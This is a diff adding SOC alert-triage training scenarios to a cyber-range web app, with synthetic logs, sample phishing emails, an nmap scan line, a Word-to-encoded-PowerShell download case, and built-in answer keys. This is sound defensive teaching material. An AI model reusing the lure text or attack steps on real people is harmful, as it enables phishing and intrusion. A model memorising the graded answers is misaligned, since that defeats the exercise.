@@ -55,6 +55,19 @@ table.lb th{color:var(--tx3);font-weight:600;font-size:12px;text-transform:upper
 table.lb th,table.lb td{text-align:left;padding:8px 6px;border-bottom:1px solid var(--bd2)}
 table.lb tr.you td{background:var(--accsub)}
 table.lb td.num{font-family:var(--mono);text-align:right}
+input.wide,select,textarea{width:100%}
+select,textarea{font-family:inherit;font-size:15px;color:var(--tx);background:var(--bg);border:1px solid var(--bd);border-radius:8px;padding:8px 10px}
+textarea{min-height:78px;resize:vertical}
+label.fld{display:flex;flex-direction:column;gap:4px;font-size:13px;color:var(--tx2)}
+label.chk{display:flex;gap:8px;align-items:flex-start;font-size:14px;color:var(--tx);margin:6px 0;cursor:pointer}
+label.chk input{margin-top:4px}
+table.siem{width:100%;border-collapse:collapse;font-size:13px}
+table.siem th{color:var(--tx3);font-weight:600;font-size:12px;text-transform:uppercase;letter-spacing:.03em}
+table.siem th,table.siem td{text-align:left;padding:8px 6px;border-bottom:1px solid var(--bd2);vertical-align:top}
+table.siem td.mono,table.siem td.ev{font-family:var(--mono);font-size:12px;word-break:break-word}
+.email{font-size:13px}
+.email pre{margin-top:8px}
+.formgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px}
 </style>
 </head>
 <body>
@@ -269,6 +282,354 @@ attack:{
 paths:[
 {id:"off",title:"Offensive path",side:"red",rooms:["red-recon","red-phish","red-sqli","red-xss","red-crack","red-dirbust","red-vishing","red-idor","red-privesc"]},
 {id:"def",title:"Defensive path",side:"blue",rooms:["blue-bruteforce","blue-ir","blue-phishtriage","blue-firewall","blue-harden","blue-ioc","blue-malware","blue-siem","blue-pcap"]}
+],
+soc:[
+{id:"soc-scanner-fp",title:"Approved scanner sweep",diff:"Beginner",reward:30,severity:"medium",time:"2026-11-18 02:05:11",source:"IDS",rule:"Internal Host Port Sweep",entity:"VULN-SCAN01 (10.8.0.50)",techid:"T1046",tech:"Network Service Discovery",
+disposition:"false-positive",action:"close-fp",
+brief:"The IDS fired on a fast port sweep from an internal host. Decide whether this is an intruder or something the SOC already authorized.",
+runbook:"Runbook SCAN-01: If the source is the approved vulnerability scanner and a change ticket covers the window, close the alert as a false positive and cite the ticket. Isolate the host only when it is not the scanner.",
+hint:"Resolve 10.8.0.50 in the CMDB lines and look for a change ticket around 02:00 UTC.",
+debrief:"VULN-SCAN01 is the vulnerability scanner. CHG-4418 authorized it from 02:00 to 04:00 UTC, the process is the signed scanner agent, and the firewall allowed it because of the scanner VLAN. The servers it touched are scan targets, not attacker infrastructure. Cite the ticket and close the alert.",
+dispositionNote:"False positive. VULN-SCAN01 is the approved scanner and CHG-4418 covers 02:00-04:00 UTC.",
+verdictNote:"The report verdict should be false positive, matching the queue decision.",
+actionNote:"Close it as a false positive and record the scanner exception for CHG-4418. Do not isolate the scanner.",
+iocNote:"There is no malicious indicator. The scanned servers are targets of an authorized scan.",
+justify:{minlen:24,groups:[["vuln-scan01","10.8.0.50","vuln-agent","scanner"],["chg-4418","approv","schedul","change","authori","ticket"]],note:"Mention the scanner (VULN-SCAN01, 10.8.0.50, or vuln-agent) and the authorization (CHG-4418 or the approved change window)."},
+who:{groups:[["vuln-scan01","10.8.0.50","svc_scan"]],note:"Who: the scanner host VULN-SCAN01 (10.8.0.50) or the account svc_scan."},
+what:{groups:[["scan","sweep","vuln"]],note:"What: an authorized vulnerability scan or port sweep."},
+when:{groups:[["02:0","02:1","chg-4418"]],note:"When: 02:05 UTC, or the 02:00-04:00 change window, or ticket CHG-4418."},
+where:{groups:[["vuln-scan01","10.8.0.50","internal"]],note:"Where: VULN-SCAN01 or 10.8.0.50 on the internal network."},
+why:{groups:[["approv","schedul","authori","change","ticket","benign"]],note:"Why: the scan was approved, scheduled, or covered by a change ticket."},
+host:{groups:[["vuln-scan01","10.8.0.50"]],note:"Affected host: VULN-SCAN01 or 10.8.0.50."},
+user:{groups:[["svc_scan","system","n/a","none","scanner"]],note:"Affected user: svc_scan. none, n/a, or system also fits a service scanner."},
+iocs:[
+{id:"none",short:"no malicious IOC",label:"No malicious IOC. This is the approved scanner.",good:true},
+{id:"srv",short:"10.1.0.12 as the attacker",label:"10.1.0.12 as attacker infrastructure (a server that was scanned)",good:false},
+{id:"creds",short:"svc_scan credential theft",label:"svc_scan credential theft",good:false}
+],
+actions:[
+{id:"close-fp",label:"Close as a false positive and note the CHG-4418 scanner exception"},
+{id:"isolate",label:"Isolate VULN-SCAN01 from the network"},
+{id:"escalate",label:"Escalate to incident response as an intrusion"},
+{id:"block",label:"Block the whole 10.0.0.0/8 range at the edge"}
+],
+logs:[
+"02:00:01 CMDB host=VULN-SCAN01 ip=10.8.0.50 role=vulnerability-scanner owner=security-ops scanner=yes",
+"02:00:04 CHANGE CHG-4418 status=approved window=02:00-04:00UTC asset=VULN-SCAN01 job=weekly-vuln-scan requester=security-ops",
+"02:05:11 IDS src=10.8.0.50 dst=10.1.0.12 proto=tcp dport=22 flags=SYN msg=port-sweep",
+"02:05:11 IDS src=10.8.0.50 dst=10.1.0.12 proto=tcp dport=445 flags=SYN msg=port-sweep",
+"02:05:12 IDS src=10.8.0.50 dst=10.1.0.15 proto=tcp dport=3389 flags=SYN msg=port-sweep",
+"02:05:11 FW ALLOW src=10.8.0.50 dst=10.1.0.12 dport=22 reason=scanner-vlan",
+"02:05:40 SYSLOG host=VULN-SCAN01 process=vuln-agent.exe user=svc_scan signed=yes parent=services.exe msg=weekly scan started",
+"02:06:14 DC01 Security 4624 Logon success user=j.patel ip=10.1.0.30 type=3",
+"02:11:18 IDS src=10.8.0.50 dst=10.1.4.20 proto=tcp flags=SYN payload=none",
+"03:50:02 SYSLOG host=VULN-SCAN01 process=vuln-agent.exe msg=scan finished findings info=9 low=3 high=0 exploits=0"
+]},
+{id:"soc-brute",title:"Brute force then a successful logon",diff:"Intermediate",reward:40,severity:"critical",time:"2026-11-18 03:14:02",source:"DC01 Security",rule:"Many failures followed by a success",entity:"svc_backup from 203.0.113.88",techid:"T1110.001",tech:"Password Guessing",
+disposition:"escalate",action:"escalate-ir",
+brief:"Windows logons on the domain controller spiked. Confirm whether the guessing stayed failed or a password was actually accepted.",
+runbook:"Runbook AUTH-04: Failed guesses with no success are a true positive you can close after confirming the block. If the same source then gets a 4624 success, escalate to IR and identity, disable the account, and reset the credential. Do not close it as a normal true positive.",
+hint:"Count 4625 events, then look for a later 4624 for the same account and source IP. Check whether that logon is used on a second host.",
+debrief:"203.0.113.88 guessed svc_backup (and administrator) and then succeeded with a type 3 network logon. The new logon touched SYSVOL and was reused on FS01. j.patel's logon from 10.1.0.30 is a separate, normal internal session. A successful guess is an account takeover: disable svc_backup, reset it, and hand the case to IR.",
+dispositionNote:"Escalate. The failures were followed by a 4624 success for svc_backup from 203.0.113.88, so this is no longer a contained guessing attempt.",
+verdictNote:"Verdict: escalate. The account is now a live credential for the attacker.",
+actionNote:"Escalate to IR, disable svc_backup, and reset that credential. Blocking the IP alone leaves the stolen password usable.",
+iocNote:"Record the attacking source and the account that was compromised. The internal user logon is not an IOC.",
+justify:{minlen:24,groups:[["4625","fail","brute","guess"],["4624","success","succeeded"]],note:"Mention the failed guesses (4625, brute force, or failures) and the later success (4624 or a successful logon)."},
+who:{groups:[["203.0.113.88","attacker","external"]],note:"Who: the source 203.0.113.88 (an external attacker)."},
+what:{groups:[["brute","guess","4625","password"]],note:"What: password guessing / brute force against Windows logons."},
+when:{groups:[["03:1","03:14"]],note:"When: the 03:14 UTC success, after failures that started at 03:11."},
+where:{groups:[["dc01","domain controller"]],note:"Where: the domain controller DC01."},
+why:{groups:[["success","4624","comprom","takeover","valid"]],note:"Why it matters: a guess succeeded, so the attacker has a valid account."},
+host:{groups:[["dc01","fs01"]],note:"Affected host: DC01, where the account was broken. FS01 is also accepted."},
+user:{groups:[["svc_backup"]],note:"Affected user: the svc_backup service account."},
+iocs:[
+{id:"ip",short:"203.0.113.88",label:"203.0.113.88, the source of the failures and the successful logon",good:true},
+{id:"acct",short:"svc_backup",label:"svc_backup, the account that was guessed and then used",good:true},
+{id:"patel",short:"10.1.0.30 j.patel",label:"10.1.0.30, j.patel's logon, as a malicious source",good:false},
+{id:"dc",short:"DC01 as the attacker",label:"DC01 itself as the attacker",good:false}
+],
+actions:[
+{id:"escalate-ir",label:"Escalate to IR, disable svc_backup, and reset that credential"},
+{id:"close-fp",label:"Close as a user who mistyped a password"},
+{id:"block-only",label:"Block 203.0.113.88 and close the case with no account change"},
+{id:"reboot",label:"Reboot DC01 and take no identity action"}
+],
+logs:[
+"03:11:02 DC01 Security 4625 Logon failed user=svc_backup ip=203.0.113.88 type=3 status=0xC000006D",
+"03:11:04 DC01 Security 4625 Logon failed user=svc_backup ip=203.0.113.88 type=3 status=0xC000006D",
+"03:11:08 DC01 Security 4625 Logon failed user=administrator ip=203.0.113.88 type=3 status=0xC000006D",
+"03:11:40 DC01 Security 4625 summary failures=36 src=203.0.113.88 users=svc_backup,administrator window=4m",
+"03:14:02 DC01 Security 4624 Logon success user=svc_backup ip=203.0.113.88 type=3 logon_id=0x4C21",
+"03:14:40 DC01 Security 5140 Share accessed user=svc_backup ip=203.0.113.88 share=\\\\DC01\\SYSVOL",
+"03:15:05 FS01 Security 4624 Logon success user=svc_backup ip=203.0.113.88 type=3",
+"08:02:11 DC01 Security 4624 Logon success user=j.patel ip=10.1.0.30 type=3",
+"03:16:00 FW note src=203.0.113.88 still allowed on 443 to the VPN portal"
+]},
+{id:"soc-travel",title:"Impossible travel and a tired MFA prompt",diff:"Intermediate",reward:40,severity:"high",time:"2026-11-18 08:31:02",source:"SSO",rule:"Impossible travel",entity:"p.nair",techid:"T1078",tech:"Valid Accounts",
+disposition:"escalate",action:"escalate-id",
+brief:"The same account signed in from two places that cannot be reached in the time between the events. Check whether the second sign-in was a clean MFA pass.",
+runbook:"Runbook ID-02: If a user signs in from a new country while the usual session is still active, and MFA shows repeated denies then an accept, escalate to identity. Revoke sessions and reset MFA. The usual office or VPN address is not the indicator.",
+hint:"Compare the 08:12 London session with the 08:31 Brazil sign-in, and read the MFA lines between them.",
+debrief:"p.nair's London session on 10.4.1.20 stayed up while 198.51.100.77 in Brazil denied MFA three times and then got an accept. That is impossible travel plus MFA fatigue, not a VPN glitch. The London address is the user's normal source. Revoke both sessions, reset MFA, and escalate to identity.",
+dispositionNote:"Escalate. Brazil accepted a sign-in while the London session was still active, after three MFA denies.",
+verdictNote:"Verdict: escalate to identity. Do not close this as a false positive.",
+actionNote:"Escalate to identity, revoke p.nair's sessions, and reset MFA. Do not block the London VPN.",
+iocNote:"The new Brazil source and the MFA fatigue are the indicators. The London VPN address is the user's normal sign-in.",
+justify:{minlen:24,groups:[["impossible","brazil","198.51.100.77","travel"],["mfa","fatigue","concurrent","london"]],note:"Mention the impossible travel or the Brazil IP 198.51.100.77, and the MFA fatigue or the still-active London session."},
+who:{groups:[["p.nair"]],note:"Who: the account p.nair."},
+what:{groups:[["impossible","mfa","travel","sign-in","signin","brazil"]],note:"What: impossible travel, a new-country sign-in, or MFA fatigue."},
+when:{groups:[["08:3","08:31","08:30"]],note:"When: 08:31 UTC, or the MFA prompts at 08:30."},
+where:{groups:[["brazil","198.51.100.77","sso","identity"]],note:"Where: the Brazil sign-in 198.51.100.77, or the SSO / identity service."},
+why:{groups:[["mfa","fatigue","concurrent","session","new country","deny"]],note:"Why it is suspicious: MFA was denied then accepted, or a second session overlapped London."},
+host:{groups:[["lap-14","sso","identity","cloud","n/a"]],note:"Affected host: the assigned laptop LAP-14, or the identity / SSO service."},
+user:{groups:[["p.nair"]],note:"Affected user: p.nair."},
+iocs:[
+{id:"ip",short:"198.51.100.77",label:"198.51.100.77, the new Brazil sign-in source",good:true},
+{id:"mfa",short:"MFA deny-then-accept",label:"MFA denied three times then accepted from the new IP",good:true},
+{id:"london",short:"10.4.1.20 London VPN",label:"10.4.1.20, the London VPN address, as a malicious source",good:false},
+{id:"laptop",short:"LAP-14 as malware",label:"LAP-14 as a malware host",good:false}
+],
+actions:[
+{id:"escalate-id",label:"Escalate to identity, revoke p.nair's sessions, and reset MFA"},
+{id:"close-fp",label:"Close as a VPN location glitch"},
+{id:"block-lon",label:"Block the London VPN range 10.4.1.0/24"},
+{id:"mail-ip",label:"Email the Brazil URL to all staff and ask them to check it"}
+],
+logs:[
+"2026-11-17 09:14:22 SSO sign-in success user=p.nair ip=10.4.1.20 geo=London mfa=satisfied session=aa11",
+"08:12:04 SSO sign-in success user=p.nair ip=10.4.1.20 geo=London mfa=satisfied app=mail session=aa11",
+"08:30:11 SSO mfa deny user=p.nair ip=198.51.100.77 geo=Brazil method=push",
+"08:30:22 SSO mfa deny user=p.nair ip=198.51.100.77 geo=Brazil method=push",
+"08:30:40 SSO mfa deny user=p.nair ip=198.51.100.77 geo=Brazil method=push",
+"08:30:55 SSO mfa accept user=p.nair ip=198.51.100.77 geo=Brazil method=push",
+"08:31:02 SSO sign-in success user=p.nair ip=198.51.100.77 geo=Brazil mfa=accepted session=bb22",
+"08:31:05 SSO session still active session=aa11 user=p.nair ip=10.4.1.20 geo=London",
+"08:12:00 CMDB asset=LAP-14 user=p.nair site=London"
+]},
+{id:"soc-phishsim",title:"Reported mail that is a training simulation",diff:"Beginner",reward:30,severity:"medium",time:"2026-11-18 09:06:11",source:"Email gateway",rule:"User reported phishing",entity:"s.iqbal",techid:"T1566.002",tech:"Spearphishing Link",
+disposition:"false-positive",action:"thank-user",
+brief:"A user reported a message that asks them to confirm a password. Read the headers before you treat the display name as proof.",
+runbook:"Runbook PHISH-02: If Authentication-Results pass, the X-PhishSim header says the campaign is approved, and the click lands on the internal training site with no password POST, close it as a false positive and thank the reporter. Reset a password only when a credential was submitted to an unapproved host.",
+hint:"Check Authentication-Results, the X-PhishSim header, and whether the proxy shows a password POST or a simulation page.",
+debrief:"The message is the approved November simulation. SPF, DKIM, and DMARC pass, X-PhishSim marks campaign 2026-11-A, and s.iqbal only opened the internal training page. The urgent subject is the bait the training is supposed to use. Thank the user for reporting. Do not reset the account or block the training domain.",
+dispositionNote:"False positive. This is approved campaign 2026-11-A, authentication passed, and no password was posted.",
+verdictNote:"Verdict: false positive. Reporting a simulation is a success, not an incident.",
+actionNote:"Close it as an approved simulation and thank s.iqbal for reporting.",
+iocNote:"Do not list the training platform as malicious. There is no attacker indicator.",
+justify:{minlen:24,groups:[["simulat","x-phishsim","training","awareness","2026-11-a"],["pass","training.globex.example","approv"]],note:"Mention the simulation or X-PhishSim header, and that authentication passed or the link is the training site."},
+who:{groups:[["training","awareness","security-awareness","s.iqbal"]],note:"Who: the security-awareness training service, or the reporter s.iqbal."},
+what:{groups:[["simulat","training","awareness","phish sim","false positive"]],note:"What: a phishing simulation or security-awareness training message."},
+when:{groups:[["09:0","09:06","09:02"]],note:"When: the 09:06 report, or the 09:02 message."},
+where:{groups:[["wks-03","s.iqbal","mailbox","training.globex.example"]],note:"Where: s.iqbal's mailbox, WKS-03, or training.globex.example."},
+why:{groups:[["approv","simulat","training","phishsim","benign","reported"]],note:"Why it is benign: it is an approved simulation, or the user was right to report training."},
+host:{groups:[["wks-03","training","n/a"]],note:"Affected host: WKS-03, or n/a because the click stayed on the training site."},
+user:{groups:[["s.iqbal"]],note:"Affected user: s.iqbal, the person who reported the message."},
+email:{
+raw:"From: \"Security Training\" <notify@security-awareness.globex.example>\nTo: s.iqbal@globex.example\nSubject: ACTION REQUIRED: unusual sign-in on your account\nDate: Wed, 18 Nov 2026 09:02:18 +0000\nReturn-Path: <notify@security-awareness.globex.example>\nReceived: from mail-train.globex.example (10.8.4.20) by mx.globex.example\nAuthentication-Results: mx.globex.example; spf=pass; dkim=pass; dmarc=pass\nX-PhishSim: approved campaign=2026-11-A\nMessage-ID: <sim-2026-11-A-441@security-awareness.globex.example>\n\nWe detected a sign-in and need you to confirm your password:\nhttps://training.globex.example/sim/2026-11-A\n\nSecurity Awareness Team",
+links:["https://training.globex.example/sim/2026-11-A"],
+attachment:null
+},
+indicatorPrompt:"Select every indicator that shows this message is a benign simulation.",
+indicatorNote:"The simulation markers are the approved X-PhishSim header, passing SPF/DKIM/DMARC, and the training.globex.example link. An urgent subject is the bait, not proof of a live attack.",
+indicators:[
+{id:"header",short:"X-PhishSim approved",label:"X-PhishSim header says the campaign is approved",good:true},
+{id:"auth",short:"SPF DKIM DMARC pass",label:"SPF, DKIM, and DMARC all pass",good:true},
+{id:"link",short:"training.globex.example",label:"The link host is training.globex.example",good:true},
+{id:"subject",short:"urgent subject",label:"The subject says ACTION REQUIRED, so it must be a live attack",good:false},
+{id:"name",short:"display name",label:"The display name Security Training is itself an indicator of compromise",good:false}
+],
+iocs:[
+{id:"none",short:"no malicious IOC",label:"No malicious IOC. The domain is the approved training platform.",good:true},
+{id:"train",short:"training.globex.example as malicious",label:"training.globex.example as a malicious domain to block enterprise-wide",good:false},
+{id:"sender",short:"notify@ as the threat actor",label:"notify@security-awareness.globex.example as an external threat actor",good:false}
+],
+actions:[
+{id:"thank-user",label:"Close as an approved simulation and thank the user for reporting"},
+{id:"reset",label:"Reset s.iqbal's password and disable the account"},
+{id:"block",label:"Block training.globex.example for the whole company"},
+{id:"page",label:"Page incident response for a confirmed account takeover"}
+],
+logs:[
+"09:02:20 MAILGW delivered to=s.iqbal@globex.example from=notify@security-awareness.globex.example src=10.8.4.20 spf=pass dkim=pass dmarc=pass header=X-PhishSim approved campaign=2026-11-A",
+"09:05:02 PROXY user=s.iqbal host=WKS-03 GET https://training.globex.example/sim/2026-11-A 200",
+"09:05:03 PROXY user=s.iqbal host=WKS-03 response=This was a simulation. Thank you for reporting. credential_post=no",
+"09:06:11 MAIL user=s.iqbal action=report-phish subject=ACTION REQUIRED: unusual sign-in on your account",
+"09:01:12 WKS-03 Sysmon 1 user=s.iqbal image=C:\\Program Files\\Browser\\browser.exe parent=explorer.exe signed=yes"
+]},
+{id:"soc-phish",title:"Phish with a credential harvest",diff:"Intermediate",reward:40,badge:"Inbox Analyst",severity:"high",time:"2026-11-18 09:41:05",source:"Email gateway",rule:"User reported phishing",entity:"m.okafor",techid:"T1566.002",tech:"Spearphishing Link",
+disposition:"escalate",action:"escalate-phish",
+brief:"m.okafor reported a mailbox warning and may already have opened it. Use the headers, the link, and the proxy before you decide the blast radius.",
+runbook:"Runbook PHISH-01: A lookalike sender with failing SPF, DKIM, and DMARC is malicious. If the proxy shows a password POST to that host, escalate. Reset the password, revoke sessions, and block the sender domain, URL, and attachment hash. Blocking the sender without resetting the account is not enough.",
+hint:"Compare the From domain with globex.example, then search the proxy for a POST by m.okafor.",
+debrief:"helpdesk@globex-support.test is not the company domain. The return path is mailer-44.example, authentication failed, and the link is a raw lookalike on login.globex-secure-mail.test. m.okafor POSTed to that host from WKS-07 before reporting the message, so the password has to be treated as stolen. Reset it, revoke the sessions, block the indicators, and escalate.",
+dispositionNote:"Escalate. Authentication failed and m.okafor submitted a password to the lookalike site.",
+verdictNote:"Verdict: escalate. A submitted credential is more than a mail-block ticket.",
+actionNote:"Escalate, reset m.okafor's password, revoke sessions, and block the sender domain, URL, and attachment hash.",
+iocNote:"Keep the lookalike domain, the harvest URL, the sending IP, and the attachment hash. The real company domain and the victim are not attacker indicators.",
+justify:{minlen:24,groups:[["phish","credential","password","harvest","globex-support.test"],["m.okafor","spf","dmarc","post","fail"]],note:"Mention the phish or the lookalike domain, and that authentication failed or m.okafor posted a password."},
+who:{groups:[["m.okafor","globex-support.test","attacker"]],note:"Who: the reporter m.okafor, or the sender domain globex-support.test."},
+what:{groups:[["phish","credential","harvest","password"]],note:"What: a phishing message built to harvest a password."},
+when:{groups:[["09:4","09:36","09:41"]],note:"When: the 09:36 message or the 09:41 report."},
+where:{groups:[["wks-07","m.okafor","mailbox"]],note:"Where: m.okafor's mailbox or workstation WKS-07."},
+why:{groups:[["post","submit","click","password","credential","harvest"]],note:"Why it is an incident: the user posted a password, or the link was a credential form."},
+host:{groups:[["wks-07"]],note:"Affected host: WKS-07."},
+user:{groups:[["m.okafor"]],note:"Affected user: m.okafor."},
+email:{
+raw:"From: \"IT Service Desk\" <helpdesk@globex-support.test>\nTo: m.okafor@globex.example\nSubject: Mailbox almost full - verify in 30 minutes\nDate: Wed, 18 Nov 2026 09:36:02 +0000\nReturn-Path: <bounce@mailer-44.example>\nReply-To: <helpdesk@globex-support.test>\nReceived: from mailer-44.example (203.0.113.44) by mx.globex.example\nAuthentication-Results: mx.globex.example; spf=fail smtp.mailfrom=globex-support.test; dkim=fail; dmarc=fail\nMessage-ID: <91af@mailer-44.example>\n\nYour mailbox is 99% full and will be locked in 30 minutes.\nVerify your password to keep receiving mail:\nhttp://login.globex-secure-mail.test/session\n\nIT Service Desk",
+links:["http://login.globex-secure-mail.test/session"],
+attachment:{name:"MailboxNotice.html",sha256:"6b1d0f9a4c2e77d18a90bc44e51f0a7d3c8e2b19f6a0d4c7e8b1a293f4d5c6e7"}
+},
+indicatorPrompt:"Select every indicator that the message is a live credential phish.",
+indicatorNote:"Failing SPF/DKIM/DMARC, the sender domain globex-support.test, the mismatched return path, and the login.globex-secure-mail.test link are the malicious markers. A display name and a busy hour are not.",
+indicators:[
+{id:"auth",short:"SPF DKIM DMARC fail",label:"SPF, DKIM, and DMARC fail",good:true},
+{id:"domain",short:"globex-support.test",label:"Sender domain globex-support.test is not globex.example",good:true},
+{id:"rpath",short:"return-path mismatch",label:"Return-Path domain mailer-44.example does not match the From domain",good:true},
+{id:"link",short:"login.globex-secure-mail.test",label:"Link host is login.globex-secure-mail.test",good:true},
+{id:"hours",short:"business hours",label:"It arrived during business hours",good:false},
+{id:"name",short:"IT Service Desk display name",label:"The display name says IT Service Desk, which proves it is internal",good:false}
+],
+iocs:[
+{id:"domain",short:"globex-support.test",label:"Sender domain globex-support.test",good:true},
+{id:"url",short:"login.globex-secure-mail.test",label:"URL host login.globex-secure-mail.test",good:true},
+{id:"hash",short:"MailboxNotice.html hash",label:"SHA256 6b1d0f9a4c2e77d18a90bc44e51f0a7d3c8e2b19f6a0d4c7e8b1a293f4d5c6e7 (MailboxNotice.html)",good:true},
+{id:"sip",short:"203.0.113.44",label:"Sending IP 203.0.113.44",good:true},
+{id:"corp",short:"globex.example",label:"globex.example, the real company domain, as a malicious domain",good:false},
+{id:"victim",short:"m.okafor as the attacker",label:"m.okafor as the threat actor",good:false}
+],
+actions:[
+{id:"escalate-phish",label:"Escalate, reset the password, revoke sessions, and block the sender, URL, and hash"},
+{id:"close-fp",label:"Close as ordinary spam and leave the password alone"},
+{id:"reply",label:"Reply to the sender and ask if the message is real"},
+{id:"forward",label:"Forward the message to all staff as a warning, with the link intact"}
+],
+logs:[
+"09:36:40 MAILGW delivered to=m.okafor@globex.example from=helpdesk@globex-support.test src=203.0.113.44 spf=fail dkim=fail dmarc=fail attachment=MailboxNotice.html sha256=6b1d0f9a4c2e77d18a90bc44e51f0a7d3c8e2b19f6a0d4c7e8b1a293f4d5c6e7",
+"09:40:12 PROXY user=m.okafor host=WKS-07 GET http://login.globex-secure-mail.test/session 200",
+"09:40:31 PROXY user=m.okafor host=WKS-07 POST http://login.globex-secure-mail.test/session 302",
+"09:41:05 MAIL user=m.okafor action=report-phish subject=Mailbox almost full - verify in 30 minutes",
+"09:39:58 WKS-07 Sysmon 1 user=m.okafor image=C:\\Program Files\\Browser\\browser.exe parent=explorer.exe signed=yes"
+]},
+{id:"soc-portscan",title:"Port scan from a user workstation",diff:"Beginner",reward:30,severity:"high",time:"2026-11-18 14:22:03",source:"IDS",rule:"Internal Port Scan - Non-Scanner Subnet",entity:"WKS-18 (10.4.18.18)",techid:"T1046",tech:"Network Service Discovery",
+disposition:"true-positive",action:"isolate",
+brief:"A second sweep showed up, this time from a user subnet. Find the process and whether this host is allowed to scan.",
+runbook:"Runbook SCAN-02: A sweep from a user workstation is a true positive even when the firewall drops the packets. Isolate that endpoint and contact the user. Escalate only if you also see a stolen credential or a second stage. The machines that were scanned are not the source.",
+hint:"Search for the process on WKS-18 and for a CMDB line that says whether that host is a scanner.",
+debrief:"a.chen launched nmap from WKS-18, which CMDB lists as a normal workstation. The firewall denied the SYNs, but the process on the endpoint proves the scan was local, not a spoof. There is no change ticket and no second stage. Isolate WKS-18 and talk to the user. The domain controller was a target, not the attacker.",
+dispositionNote:"True positive. WKS-18 is not a scanner, and a.chen ran nmap. Denied packets do not make that authorized.",
+verdictNote:"Verdict: true positive. The L1 runbook is to contain this endpoint, not to escalate it as a domain compromise.",
+actionNote:"Isolate WKS-18 and contact a.chen. Do not close it as an approved scan.",
+iocNote:"The workstation address and nmap.exe are the indicators. The domain controller was only a target.",
+justify:{minlen:24,groups:[["nmap","a.chen","wks-18","10.4.18.18"],["unauthor","not a scanner","not approved","workstation","no ticket","no change","policy"]],note:"Mention nmap or WKS-18 / a.chen, and that the host is not an approved scanner."},
+who:{groups:[["a.chen","wks-18"]],note:"Who: a.chen or the workstation WKS-18."},
+what:{groups:[["nmap","port scan","syn scan","sweep","recon"]],note:"What: an nmap or port scan from a workstation."},
+when:{groups:[["14:2","14:22"]],note:"When: 14:22 UTC."},
+where:{groups:[["wks-18","10.4.18.18","workstation"]],note:"Where: WKS-18 or 10.4.18.18."},
+why:{groups:[["unauthor","not approved","not a scanner","policy","user ran","no ticket"]],note:"Why it is a true positive: the workstation is not an approved scanner, or there is no ticket."},
+host:{groups:[["wks-18","10.4.18.18"]],note:"Affected host: WKS-18 or 10.4.18.18."},
+user:{groups:[["a.chen"]],note:"Affected user: a.chen."},
+iocs:[
+{id:"ip",short:"10.4.18.18",label:"10.4.18.18, the workstation that sent the sweep",good:true},
+{id:"nmap",short:"nmap.exe on WKS-18",label:"C:\\Users\\a.chen\\Downloads\\nmap.exe on WKS-18",good:true},
+{id:"dc",short:"10.1.0.5 as the attacker",label:"10.1.0.5, the domain controller, as the attacker",good:false},
+{id:"chrome",short:"browser.exe",label:"The signed browser on WKS-18 as the scanning tool",good:false}
+],
+actions:[
+{id:"isolate",label:"Isolate WKS-18 and contact a.chen"},
+{id:"close-fp",label:"Close as an approved vulnerability scan"},
+{id:"wait",label:"Leave the host online and wait to see if it scans again"},
+{id:"disable-admin",label:"Disable the domain administrator account"}
+],
+logs:[
+"14:20:11 CMDB host=WKS-18 ip=10.4.18.18 role=user-workstation user=a.chen scanner=no site=office",
+"14:21:02 WKS-18 Sysmon 1 user=a.chen image=C:\\Program Files\\Browser\\browser.exe parent=explorer.exe signed=yes",
+"14:21:58 WKS-18 Sysmon 1 user=a.chen parent=cmd.exe image=C:\\Users\\a.chen\\Downloads\\nmap.exe command=nmap.exe -sS 10.1.0.0/24 signed=no",
+"14:22:03 IDS src=10.4.18.18 dst=10.1.0.5 proto=tcp dport=445 flags=SYN msg=port-sweep",
+"14:22:03 IDS src=10.4.18.18 dst=10.1.0.12 proto=tcp dport=22 flags=SYN msg=port-sweep",
+"14:22:04 IDS src=10.4.18.18 dst=10.1.0.15 proto=tcp dport=3389 flags=SYN msg=port-sweep",
+"14:22:03 FW DENY src=10.4.18.18 dst=10.1.0.12 dport=22 reason=user-vlan-to-server",
+"14:22:06 FW DENY src=10.4.18.18 dst=10.1.0.5 dport=445 reason=user-vlan-to-server",
+"14:30:00 CHANGE search asset=WKS-18 window=14:00-15:00 result=no matching ticket"
+]},
+{id:"soc-powershell",title:"Encoded PowerShell from Word",diff:"Advanced",reward:55,severity:"critical",time:"2026-11-18 15:06:11",source:"Sysmon",rule:"Suspicious encoded PowerShell",entity:"WKS-22",techid:"T1059.001",tech:"PowerShell",
+disposition:"escalate",action:"escalate-mal",
+brief:"EDR flagged powershell.exe with a hidden window and an encoded command. Separate the admin script that also ran today from the process on this host.",
+runbook:"Runbook POW-03: Encoded PowerShell spawned by Office, with a hidden window and an outbound connection, is escalate to malware IR. Isolate the endpoint. A signed inventory script run by the management account on a different host is not the same activity.",
+hint:"Open the Sysmon process-create line on WKS-22 and note the parent image. Then check the decoder and the network event.",
+debrief:"WINWORD.EXE on WKS-22 started hidden, encoded PowerShell as r.diaz. The SIEM decoder shows a download from http://203.0.113.50/a.ps1, and Sysmon event 3 shows the connection. The inventory.ps1 run on WKS-04 by svc_mgmt is a different, signed admin script. Isolate WKS-22 and escalate to malware IR. Do not add -enc to an allowlist.",
+dispositionNote:"Escalate. Office spawned encoded PowerShell that downloaded a script. That goes to malware IR, not to a normal-admin close.",
+verdictNote:"Verdict: escalate.",
+actionNote:"Escalate to malware IR and isolate WKS-22.",
+iocNote:"203.0.113.50 and the Word-to-encoded-PowerShell chain on WKS-22 are the indicators. The inventory script is admin activity on another PC.",
+justify:{minlen:24,groups:[["encod","-enc","powershell"],["winword","word","203.0.113.50","download"]],note:"Mention encoded PowerShell (or -enc) and either the Word parent or the download host 203.0.113.50."},
+who:{groups:[["r.diaz","wks-22"]],note:"Who: r.diaz or WKS-22."},
+what:{groups:[["powershell","encoded","-enc","download"]],note:"What: encoded PowerShell or a download cradle launched on the endpoint."},
+when:{groups:[["15:0","15:06"]],note:"When: 15:06 UTC."},
+where:{groups:[["wks-22"]],note:"Where: WKS-22."},
+why:{groups:[["winword","word","macro","office","malware","cradle","hidden"]],note:"Why it is hostile: Word spawned it, the window was hidden, or it is a download cradle."},
+host:{groups:[["wks-22"]],note:"Affected host: WKS-22."},
+user:{groups:[["r.diaz"]],note:"Affected user: r.diaz."},
+iocs:[
+{id:"ip",short:"203.0.113.50",label:"203.0.113.50, the host that served the downloaded script",good:true},
+{id:"chain",short:"WINWORD to encoded PowerShell",label:"WINWORD.EXE spawning encoded powershell.exe on WKS-22",good:true},
+{id:"inv",short:"inventory.ps1",label:"C:\\Windows\\Admin\\inventory.ps1 on WKS-04",good:false},
